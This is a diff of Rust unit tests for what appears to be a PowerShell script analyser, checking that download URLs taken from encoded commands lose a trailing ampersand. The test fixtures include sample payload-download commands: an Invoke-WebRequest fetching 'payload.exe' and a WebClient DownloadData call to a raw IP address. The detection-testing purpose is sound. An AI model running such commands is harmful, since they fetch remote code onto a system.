@@ -9973,6 +9973,32 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_quoted_url_trims_terminal_ampersand() {
+        let ps = r#"Invoke-WebRequest -Uri 'https://raw.example/path/payload.exe&' -OutFile 'payload.exe'"#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://raw.example/path/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "terminal ampersand was not trimmed from IWR URL: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| { matches!(t, Trait::Download { src, .. } if src.ends_with('&')) }),
+            "terminal ampersand leaked into Download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn webclient_downloaddata_concatenated_variable_url_extracted() {
         let ps = r#"$ser=$('http://147.182.170.15:9090');$t='/admin/get.php';$wc=New-Object Net.WebClient;$wc.DownloadData($Ser+$T)"#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
@@ -17870,6 +17896,34 @@ mod deob_scan_noise_filter_tests {
         assert!(
             !has_noise,
             "malformed raw.githubusercontent prefix not filtered: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlVariable { name, url, .. }
+                        if name == "SEVEN_ZIP_URL"
+                            && url == "https://raw.githubusercontent.com/example/repo/main/7z.exe"
+                )
+            }),
+            "terminal ampersand was not trimmed from URL variable: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src.ends_with('&')
+                ) || matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src.ends_with('&')
+                ) || matches!(
+                    t,
+                    Trait::UrlVariable { url, .. } if url.ends_with('&')
+                )
+            }),
+            "terminal ampersand leaked into URL trait: {:?}",
             report.traits
         );
     }
